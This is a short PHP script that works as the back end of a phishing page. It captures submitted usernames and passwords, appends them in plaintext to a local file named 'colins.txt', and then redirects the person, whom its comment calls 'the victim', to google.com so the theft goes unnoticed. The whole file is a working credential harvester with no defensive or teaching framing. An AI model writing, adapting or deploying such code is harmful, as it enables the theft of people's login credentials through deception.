<?php
// Capture form data
$username = $_POST['username'];
$password = $_POST['password'];

// Save data to a file
file_put_contents('colins.txt', "Username: $username, Password: $password\n", FILE_APPEND);

// Redirect the victim to the legitimate site
header('Location: https://google.com');
exit;
?>